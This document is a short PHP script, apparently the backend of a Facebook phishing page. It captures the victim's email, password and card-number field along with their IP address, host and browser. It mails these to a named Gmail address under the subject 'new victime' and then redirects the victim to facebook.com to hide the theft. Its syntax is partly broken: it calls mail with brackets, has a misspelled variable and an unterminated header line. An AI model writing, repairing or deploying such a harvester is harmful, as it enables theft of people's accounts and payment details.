<?php
$ip = getenv("REMOTE_ADDR");
$message .= "-------------------- Facebook --------------------\n";
$message .= "-------------- Infos --------------\n";
$message .= "Email Adresse      : ".$_POST['email']."\n";
$message .= "Password         :  ".$_POST['pass']."\n";
$message .= "-------------- IP INfos --------------\n";
$message .= "IP      : $ip\n";
$message .= "HOST    : ".gethostbyaddr($ip)."\n";
$message .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Derradji Laghmam ----------------------\n";
$cc =$_POST['ccn'];
$subject = "new victime By Derradji ".$_POST['exm']."/".$_POST['exy'];
$send = "derradjisenani05@gmail.com";
$headers = 'From: mail@srvd32.hosteur.com' . "\r\n" .
mail[$send,$subject,$massage,$headers];

header("Location: http://facebook.com/");?>